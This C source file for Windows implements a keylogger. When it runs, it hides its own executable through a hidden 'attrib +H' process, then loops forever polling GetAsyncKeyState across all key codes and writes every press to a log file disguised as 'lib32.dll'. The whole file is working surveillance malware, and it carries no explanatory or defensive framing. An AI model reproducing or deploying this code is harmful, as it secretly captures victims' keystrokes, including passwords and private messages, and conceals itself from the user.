#include <stdio.h>
#include <stdlib.h>
#include <locale.h>
#include <shlwapi.h>

#include "key.h"

#define KEY_LOG "lib32.dll"
#define LEN_NAME 512

bool hide(char *path){
    STARTUPINFO sinfo = {};
    PROCESS_INFORMATION pinfo = {};
    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = STARTF_USESHOWWINDOW;
    sinfo.wShowWindow = SW_HIDE;
    return CreateProcess(NULL, path, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &sinfo, &pinfo);
}

int main(int argc, char **argv){
    int i = 0;
    int state = 0;
    setlocale(LC_ALL, "Russian");
    char path[LEN_NAME] = {'\0'};
    char fullpath[LEN_NAME] = {'\0'};
    GetModuleFileName(NULL, path, sizeof(path));
    snprintf(fullpath, LEN_NAME, "attrib +H %s", path);
    hide(fullpath);
    PathRemoveFileSpec(path);
    snprintf(path, LEN_NAME, "%s\\%s", path, KEY_LOG);
    while(true){
        for(i = 0; i < 255; i++){
            state = GetAsyncKeyState(i);
            if(state == 1 || state == -32767)
                save_file(path, key_value(i));
        }
        Sleep(1);
    }
    return 0;
}
